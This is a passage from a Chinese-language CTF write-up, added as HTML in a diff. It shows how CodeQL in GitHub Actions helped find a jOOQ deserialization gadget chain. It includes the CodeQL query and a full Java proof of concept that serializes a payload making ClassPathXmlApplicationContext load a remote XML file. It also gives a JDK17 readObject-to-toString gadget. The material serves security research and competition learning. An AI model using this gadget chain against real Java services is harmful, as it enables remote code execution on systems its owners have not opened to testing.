+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">runs-on</span>: ${{ (matrix.language == &#39;swift&#39; &amp;&amp; &#39;macos-latest&#39;) || &#39;ubuntu-latest&#39; }}
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">timeout-minutes</span>: ${{ (matrix.language == &#39;swift&#39; &amp;&amp; 120) || 360 }}
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">permissions</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#6272a4"># required for all workflows</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">security-events</span>: write
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#6272a4"># only required for workflows in private repositories</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">actions</span>: read
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">contents</span>: read
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">strategy</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">fail-fast</span>: <span style="color:#ff79c6">false</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">matrix</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">include</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#ff79c6">language</span>: java-kotlin
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">build-mode</span>: autobuild
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># CodeQL supports the following values keywords for &#39;language&#39;: &#39;c-cpp&#39;, &#39;csharp&#39;, &#39;go&#39;, &#39;java-kotlin&#39;, &#39;javascript-typescript&#39;, &#39;python&#39;, &#39;ruby&#39;, &#39;swift&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Use `c-cpp` to analyze code written in C, C++ or both</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Use &#39;java-kotlin&#39; to analyze code written in Java, Kotlin or both</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Use &#39;javascript-typescript&#39; to analyze code written in JavaScript, TypeScript or both</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># To learn more about changing the languages that are analyzed or customizing the build mode for your analysis,</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># see https://docs.github.com/en/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># If you are analyzing a compiled language, you can modify the &#39;build-mode&#39; for that language to customize how</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># your codebase is analyzed, see https://docs.github.com/en/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">steps</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">name</span>: Checkout repository
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">uses</span>: actions/checkout@v4
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">name</span>: Setup Java JDK
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">uses</span>: actions/setup-java@v4.2.1
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">with</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">java-version</span>: <span style="color:#f1fa8c">&#39;17&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">distribution</span>: <span style="color:#f1fa8c">&#39;oracle&#39;</span>
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Initializes the CodeQL tools for scanning.</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">name</span>: Initialize CodeQL
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">uses</span>: github/codeql-action/init@v3
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">with</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">languages</span>: ${{ matrix.language }}
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">build-mode</span>: ${{ matrix.build-mode }}
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># If you wish to specify custom queries, you can do so here or in a config file.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># By default, queries listed here will override any specified in a config file.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Prefix the list here with &#34;+&#34; to use these queries and those in the config file.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># For more details on CodeQL&#39;s query packs, refer to: https://docs.github.com/en/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/configuring-code-scanning#using-queries-in-ql-packs</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># queries: security-extended,security-and-quality</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># If the analyze step fails for one of the languages you are analyzing with</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># &#34;We were unable to automatically build your code&#34;, modify the matrix above</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># to set the build mode to &#34;manual&#34; for that language. Then modify this step</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># to build your code.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># ℹ️ Command-line programs to run using the OS shell.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># 📚 See https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">if</span>: matrix.build-mode == &#39;manual&#39;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">run</span>: |<span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        echo &#39;If you are using a &#34;manual&#34; build mode for one or more of the&#39; \
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">          &#39;languages you are analyzing, replace this with the commands to build&#39; \
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">          &#39;your code, for example:&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        echo &#39;  make bootstrap&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        echo &#39;  make release&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        exit 1</span>        
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">name</span>: Perform CodeQL Analysis
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">uses</span>: github/codeql-action/analyze@v3
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">with</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">category</span>: <span style="color:#f1fa8c">&#34;/language:${{matrix.language}}&#34;</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">name</span>: Upload CodeQL database as artifact
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">uses</span>: actions/upload-artifact@v4
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">with</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">name</span>: codeql-database-${{ matrix.language }}
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">path</span>: /home/runner/work/_temp/codeql_databases/
+</span></span></code></pre></div><h3 id="利用链-1">利用链</h3>
+<p>代码搜索可以发现ConvertAll#from可以调用constructor，可以使用ClassPathXmlApplicationContext</p>
+<p>本地ql查询getter -&gt; from</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * @kind path-problem
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> semmle.code.java.dataflow.FlowSources
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> semmle.code.java.dataflow.DataFlow
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Getter</span> <span style="color:#8be9fd;font-style:italic">extends</span> Method {
+</span></span><span style="display:flex;"><span>  Getter() { <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">getName</span>().<span style="color:#50fa7b">regexpMatch</span>(<span style="color:#f1fa8c">&#34;get.+&#34;</span>) 
+</span></span><span style="display:flex;"><span>  and 
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">getNumberOfParameters</span>() <span style="color:#ff79c6">=</span> 0 
+</span></span><span style="display:flex;"><span>  and
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">isPublic</span>()
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Source</span> <span style="color:#8be9fd;font-style:italic">extends</span> Callable {
+</span></span><span style="display:flex;"><span>  Source() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">this</span> <span style="color:#ff79c6">instanceof</span> Getter and <span style="color:#50fa7b">getDeclaringType</span>().<span style="color:#50fa7b">getASupertype</span><span style="color:#ff79c6">*</span>() <span style="color:#ff79c6">instanceof</span> TypeSerializable
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">SinkMethod</span> <span style="color:#8be9fd;font-style:italic">extends</span> Method {
+</span></span><span style="display:flex;"><span>  SinkMethod() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">hasName</span>(<span style="color:#f1fa8c">&#34;from&#34;</span>)
+</span></span><span style="display:flex;"><span>    and
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">getNumberOfParameters</span>() <span style="color:#ff79c6">=</span> 2
+</span></span><span style="display:flex;"><span>    and
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">getDeclaringType</span>().<span style="color:#50fa7b">hasName</span>(<span style="color:#f1fa8c">&#34;ConvertAll&#34;</span>)
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">DangerousMethod</span> <span style="color:#8be9fd;font-style:italic">extends</span> Callable {
+</span></span><span style="display:flex;"><span>  DangerousMethod() { <span style="color:#ff79c6">this</span> <span style="color:#ff79c6">instanceof</span> SinkMethod }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">CallsDangerousMethod</span> <span style="color:#8be9fd;font-style:italic">extends</span> Callable {
+</span></span><span style="display:flex;"><span>  CallsDangerousMethod() {
+</span></span><span style="display:flex;"><span>    exists(Callable a <span style="color:#ff79c6">|</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">polyCalls</span>(a) and
+</span></span><span style="display:flex;"><span>      a <span style="color:#ff79c6">instanceof</span> DangerousMethod
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>query predicate <span style="color:#50fa7b">edges</span>(Callable a, Callable b) {
+</span></span><span style="display:flex;"><span>  a.<span style="color:#50fa7b">polyCalls</span>(b)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>from Source source, CallsDangerousMethod sink
+</span></span><span style="display:flex;"><span>where edges<span style="color:#ff79c6">+</span>(source, sink)
+</span></span><span style="display:flex;"><span>select source, source, sink, <span style="color:#f1fa8c">&#34;$@ $@ to $@ $@&#34;</span>, source.<span style="color:#50fa7b">getDeclaringType</span>(),
+</span></span><span style="display:flex;"><span>  source.<span style="color:#50fa7b">getDeclaringType</span>().<span style="color:#50fa7b">getName</span>(), source, source.<span style="color:#50fa7b">getName</span>(), sink.<span style="color:#50fa7b">getDeclaringType</span>(),
+</span></span><span style="display:flex;"><span>  sink.<span style="color:#50fa7b">getDeclaringType</span>().<span style="color:#50fa7b">getName</span>(), sink, sink.<span style="color:#50fa7b">getName</span>()
+</span></span></code></pre></div><p>误报还是很多（</p>
+<p><img src="
+        /posts/2024_fall/assets/2662112-20240328002106786-1567661378.png" alt="image"/></p>
+<p>观察这几个类可以构造如下链子</p>
+<pre tabindex="0"><code>ConvertedVal{
+  name:AbstractName.NO_NAME,
+  comment:CommentImpl.NO_COMMENT
+  delegate:QualifiedRecordConstant{
+    value:&#34;url&#34;,
+  }
+  type:ConvertedDataType{
+    binding:ChainedConverterBinding{
+      chained:ConvertAll{
+        toClass:ClassPathXmlApplicationContext.class,
+        toType:Integer.class
+      }
+    }
+    delegate:DefaultDataType{
+      utype:String.class
+      tType:String.class
+    }
+  }
+}
+</code></pre><h3 id="poc-1">POC</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">final</span> String URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://127.0.0.1:8000/poc.xml&#34;</span>;  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Object convertAll <span style="color:#ff79c6">=</span> ReflectUtils.<span style="color:#50fa7b">createWithoutConstructor</span>(<span style="color:#f1fa8c">&#34;org.jooq.impl.Convert$ConvertAll&#34;</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(convertAll, <span style="color:#f1fa8c">&#34;toClass&#34;</span>, ClassPathXmlApplicationContext.<span style="color:#50fa7b">class</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(convertAll, <span style="color:#f1fa8c">&#34;toType&#34;</span>, Integer.<span style="color:#50fa7b">class</span>);  
+</span></span><span style="display:flex;"><span>Object chainedConverterBinding <span style="color:#ff79c6">=</span> ReflectUtils.<span style="color:#50fa7b">createWithoutConstructor</span>(<span style="color:#f1fa8c">&#34;org.jooq.impl.ChainedConverterBinding&#34;</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(chainedConverterBinding, <span style="color:#f1fa8c">&#34;chained&#34;</span>, convertAll);  
+</span></span><span style="display:flex;"><span>Object convertedDataType <span style="color:#ff79c6">=</span> ReflectUtils.<span style="color:#50fa7b">createWithoutConstructor</span>(<span style="color:#f1fa8c">&#34;org.jooq.impl.ConvertedDataType&#34;</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(convertedDataType, <span style="color:#f1fa8c">&#34;binding&#34;</span>, chainedConverterBinding);  
+</span></span><span style="display:flex;"><span>Object defaultDataType <span style="color:#ff79c6">=</span> ReflectUtils.<span style="color:#50fa7b">createWithoutConstructor</span>(<span style="color:#f1fa8c">&#34;org.jooq.impl.DefaultDataType&#34;</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(defaultDataType, <span style="color:#f1fa8c">&#34;uType&#34;</span>, String.<span style="color:#50fa7b">class</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(defaultDataType, <span style="color:#f1fa8c">&#34;tType&#34;</span>, String.<span style="color:#50fa7b">class</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(convertedDataType, <span style="color:#f1fa8c">&#34;delegate&#34;</span>, defaultDataType);  
+</span></span><span style="display:flex;"><span>Object qualifiedRecordConstant <span style="color:#ff79c6">=</span> ReflectUtils.<span style="color:#50fa7b">createWithoutConstructor</span>(<span style="color:#f1fa8c">&#34;org.jooq.impl.QualifiedRecordConstant&#34;</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(qualifiedRecordConstant, <span style="color:#f1fa8c">&#34;value&#34;</span>, URL);  
+</span></span><span style="display:flex;"><span>Object convertedVal <span style="color:#ff79c6">=</span> ReflectUtils.<span style="color:#50fa7b">createWithoutConstructor</span>(<span style="color:#f1fa8c">&#34;org.jooq.impl.ConvertedVal&#34;</span>);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(convertedVal, <span style="color:#f1fa8c">&#34;delegate&#34;</span>, qualifiedRecordConstant);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(convertedVal, <span style="color:#f1fa8c">&#34;type&#34;</span>, convertedDataType);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(convertedVal, <span style="color:#f1fa8c">&#34;name&#34;</span>, ReflectUtils.<span style="color:#50fa7b">newInstance</span>(<span style="color:#f1fa8c">&#34;org.jooq.impl.UnqualifiedName&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>));  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(convertedVal, <span style="color:#f1fa8c">&#34;comment&#34;</span>, ReflectUtils.<span style="color:#50fa7b">newInstance</span>(<span style="color:#f1fa8c">&#34;org.jooq.impl.CommentImpl&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>));  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>ClassPool classPool <span style="color:#ff79c6">=</span> ClassPool.<span style="color:#50fa7b">getDefault</span>();  
+</span></span><span style="display:flex;"><span>CtClass ctClass <span style="color:#ff79c6">=</span> classPool.<span style="color:#50fa7b">get</span>(<span style="color:#f1fa8c">&#34;com.fasterxml.jackson.databind.node.BaseJsonNode&#34;</span>);  
+</span></span><span style="display:flex;"><span>CtMethod ctMethod <span style="color:#ff79c6">=</span> ctClass.<span style="color:#50fa7b">getDeclaredMethod</span>(<span style="color:#f1fa8c">&#34;writeReplace&#34;</span>);  
+</span></span><span style="display:flex;"><span>ctClass.<span style="color:#50fa7b">removeMethod</span>(ctMethod);  
+</span></span><span style="display:flex;"><span>ctClass.<span style="color:#50fa7b">toClass</span>();  
+</span></span><span style="display:flex;"><span>POJONode node <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> POJONode(convertedVal);  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>XString xString <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> XString(<span style="color:#f1fa8c">&#34;&#34;</span>);  
+</span></span><span style="display:flex;"><span>HashMap map1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap();  
+</span></span><span style="display:flex;"><span>HashMap map2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap();  
+</span></span><span style="display:flex;"><span>map1.<span style="color:#50fa7b">put</span>(<span style="color:#f1fa8c">&#34;yy&#34;</span>, node);  
+</span></span><span style="display:flex;"><span>map1.<span style="color:#50fa7b">put</span>(<span style="color:#f1fa8c">&#34;zZ&#34;</span>, xString);  
+</span></span><span style="display:flex;"><span>map2.<span style="color:#50fa7b">put</span>(<span style="color:#f1fa8c">&#34;yy&#34;</span>, xString);  
+</span></span><span style="display:flex;"><span>map2.<span style="color:#50fa7b">put</span>(<span style="color:#f1fa8c">&#34;zZ&#34;</span>, node);  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>HashMap gadget <span style="color:#ff79c6">=</span> ReflectUtils.<span style="color:#50fa7b">deserialize2HashCode</span>(map1, map2);  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> poc <span style="color:#ff79c6">=</span> ReflectUtils.<span style="color:#50fa7b">serialize</span>(gadget);  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">deserialize</span>(poc);
+</span></span></code></pre></div><h1 id="后记">后记</h1>
+<h2 id="补充知识">补充知识</h2>
+<p>官方WP给了JDK17下readObject -&gt; toString的gadget</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>EventListenerList eventListenerList <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> EventListenerList();
+</span></span><span style="display:flex;"><span>UndoManager undoManager <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> UndoManager();
+</span></span><span style="display:flex;"><span>Vector vector <span style="color:#ff79c6">=</span> (Vector) ReflectUtil.<span style="color:#50fa7b">getFieldValue</span>(undoManager, <span style="color:#f1fa8c">&#34;edits&#34;</span>);
+</span></span><span style="display:flex;"><span>vector.<span style="color:#50fa7b">add</span>(pojoNode);
+</span></span><span style="display:flex;"><span>ReflectUtil.<span style="color:#50fa7b">setFieldValue</span>(eventListenerList, <span style="color:#f1fa8c">&#34;listenerList&#34;</span>, <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]</span>{InternalError.<span style="color:#50fa7b">class</span>, undoManager});
+</span></span></code></pre></div><p>在本文给出的POC中我用到了XString，在编写POC的时候有模块隔离，但是在反序列化的时候是正常的。这也是咱们DubheCTF 2024用到的gadget</p>
+<p><a href="https://h4cking2thegate.github.io/posts/42795/">Javolution 出题小记 | H4cking to the Gate . (h4cking2thegate.github.io)</a></p>
+<h2 id="有人发出了又菜又爱叫的声音">有人发出了又菜又爱叫的声音</h2>
+<p>严重觉得jOOQ overdesign，而且所有的类写在同一个包里，而且还有deadcode&hellip;</p>
+
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#题目背景">题目背景</a>
+      <ul>
+        <li><a href="#agent">agent</a></li>
+        <li><a href="#server">server</a></li>
+      </ul>
+    </li>
+    <li><a href="#hacking-with-github-actions">Hacking With Github Actions</a>
+      <ul>
+        <li><a href="#agent-1">agent</a>
+          <ul>
+            <li><a href="#云编译">云编译</a></li>
+            <li><a href="#利用链">利用链</a></li>
+            <li><a href="#poc">POC</a></li>
+          </ul>
+        </li>
+        <li><a href="#server-1">server</a>
+          <ul>
+            <li><a href="#云编译-1">云编译</a></li>
+            <li><a href="#利用链-1">利用链</a></li>
+            <li><a href="#poc-1">POC</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#后记">后记</a>
+      <ul>
+        <li><a href="#补充知识">补充知识</a></li>
+        <li><a href="#有人发出了又菜又爱叫的声音">有人发出了又菜又爱叫的声音</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2024 </span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
